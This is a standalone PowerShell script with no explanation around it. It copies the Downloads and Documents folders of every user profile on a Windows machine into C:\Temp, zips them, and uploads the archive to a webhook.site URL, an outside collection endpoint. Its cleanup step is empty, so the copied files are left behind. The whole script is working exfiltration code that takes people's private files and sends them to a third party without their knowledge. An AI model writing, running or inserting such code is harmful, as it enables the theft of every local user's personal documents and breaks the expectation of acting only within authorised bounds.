# Create the C:\Temp directory if it doesn't exist
$tempDir = "C:\Temp"
if (-not (Test-Path $tempDir -PathType Container)) {
    New-Item -Path $tempDir -ItemType Directory
}

# Define the destination zip file
$zipFile = Join-Path $tempDir "UsersData.zip"

# Loop through each user profile to find the Downloads and Documents folders
$users = Get-ChildItem "C:\Users" -Directory
foreach ($user in $users) {
    $downloadsFolder = Join-Path $user.FullName "Downloads"
    $documentsFolder = Join-Path $user.FullName "Documents"
    
    # Check if the folders exist before attempting to add them to the zip file
    if ((Test-Path $downloadsFolder) -and (Test-Path $documentsFolder)) {
        # Create a temporary folder for each user to avoid conflicts
        $tempUserDir = Join-Path $tempDir $user.Name
        New-Item -Path $tempUserDir -ItemType Directory

        try {
            # Copy the Downloads and Documents folders to the temporary folder
            Get-ChildItem $downloadsFolder | Copy-Item -Destination $tempUserDir -Recurse -Force
            Get-ChildItem $documentsFolder | Copy-Item -Destination $tempUserDir -Recurse -Force
        } catch {
            Write-Host "Error copying files for user $($user.Name): $_"
        }
    }
}

try {
    # Create a new empty zip file using Compress-Archive
    Compress-Archive -Path "$tempDir\*" -DestinationPath $zipFile -Force

    # Upload the zip file to the webhook
    (New-Object System.Net.WebClient).UploadFile("https://webhook.site/138caf52-ee90-4162-a0e3-1d6d140a967d", $zipFile)
} catch {
    Write-Host "Error creating or uploading the zip file: $_"
} finally {
    # Remove the temporary folder
    
}
